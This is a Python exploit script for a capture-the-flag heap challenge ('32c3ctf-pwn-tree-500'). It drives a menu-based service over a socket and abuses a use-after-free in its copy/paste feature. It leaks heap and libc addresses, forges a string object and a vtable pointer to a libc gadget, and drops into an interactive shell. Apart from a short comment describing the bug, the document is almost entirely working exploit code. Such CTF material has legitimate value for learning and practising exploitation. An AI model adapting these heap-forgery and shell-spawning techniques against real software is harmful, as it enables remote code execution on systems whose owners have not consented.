#!/usr/bin/env python
# -*- coding: utf-8 -*-
import struct
import socket
import telnetlib

host = "10.211.55.23"
port = 8888
#host = "136.243.194.39"
#port = 1024

# 32c3ctf-pwn-tree-500
# ------------------------------------------------------
# Vulnerability:
# Copy a String Child would cause use after free when string is updated.
# Because the string child is not updated in the clipboard.

def make_conn(host,port):
    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    sock.connect((host,port))
    return sock

def recvuntil(sock,delim = '\n') :
    data = ""
    while not data.endswith(delim):
        data += sock.recv(1)
    return data

def sendline(sock,data):
    sock.send(data + '\n')
    return 1

def inter(sock):
    t = telnetlib.Telnet()
    t.sock = sock
    t.interact()

def pack(data,fmt="<Q"):
    return struct.pack(fmt,data)

def unpack(data,fmt="<Q"):
    return struct.unpack(fmt,data)[0]

def listchild(sock,append = None):
    recvuntil(sock,"action:")
    if append :
        sendline(sock,"3"+append)
    else :
        sendline(sock,"3")
    return recvuntil(sock,"0(end)")

def addstr(sock,text):
    recvuntil(sock,"action:")
    sendline(sock,"4")
    recvuntil(sock,"text")
    sendline(sock,text)

def addlist(sock):
    recvuntil(sock,"action:")
    sendline(sock,"6")


def addnum(sock,num):
    recvuntil(sock,"action:")
    sendline(sock,"5")
    recvuntil(sock,":")
    sendline(sock,str(num))

def copychild(sock,index):
    recvuntil(sock,"action:")
    sendline(sock,"8")
    recvuntil(sock,":")
    sendline(sock,str(index))

def updatechild(sock,text,index):
    recvuntil(sock,"action:")
    sendline(sock,"7")
    recvuntil(sock,":")
    sendline(sock,str(index))
    recvuntil(sock,":")
    sendline(sock,text)

def paste(sock):
    recvuntil(sock,"action:")
    sendline(sock,"9")

def dele(sock,index):
    recvuntil(sock,"action:")
    sendline(sock,"10")
    recvuntil(sock,":")
    sendline(sock,str(index))

def enter(sock,index):
    recvuntil(sock,"action:")
    sendline(sock,"1")
    recvuntil(sock,":")
    sendline(sock,str(index))

def leave(sock):
    recvuntil(sock,"action:")
    sendline(sock,"2")


sock = make_conn(host,port)

#create a dangling pointer
addstr(sock,"ddaa") #0
copychild(sock,0)
updatechild(sock,"a"*0xa0,0)

#Alloca some object so that we can use the dangling pointer
addnum(sock,123)
listchild(sock,"a"*36)
addnum(sock,123)

#forge a string object
strobj = "\x00"*7 
strobj += pack(0x50)
strobj += pack(0x8)
strobj += pack(0)
strobj += "ddaaddaa"
listchild(sock,strobj)
dele(sock,"1")
paste(sock)

#leak some information
unsortbin_off = 0x3c4c58
data = listchild(sock)
heap = unpack(data.split("ddaaddaa")[1][16:24])
libc = unpack(data.split("ddaaddaa")[1][24:32]) - unsortbin_off

print "heap : ",hex(heap)
print "libc : ",hex(libc)

#alloca a list child object
addlist(sock)
addlist(sock)
enter(sock,"4")
addlist(sock)
addlist(sock)
#let it like a string object
addnum(sock,"0.0")
dele(sock,0)
dele(sock,0)
leave(sock)

#call string destructor so that we can use the dangling to forge a list child
dele(sock,2)
dele(sock,0)
dele(sock,1)
listchild(sock,"a"*20)
updatechild(sock,"123",0)

#magic gadget
magic = libc + 0x442aa

#forge the list Child vptr and vtable
payload = "c"*8 
payload += pack(magic)
payload += pack(heap + 0xe0)
payload += "b"*0x10
addstr(sock,payload)

#trigger the virtual function call
recvuntil(sock,"action:")
sendline(sock,"3")
recvuntil(sock,"0:1(lst):")
print "Get shell"
inter(sock)
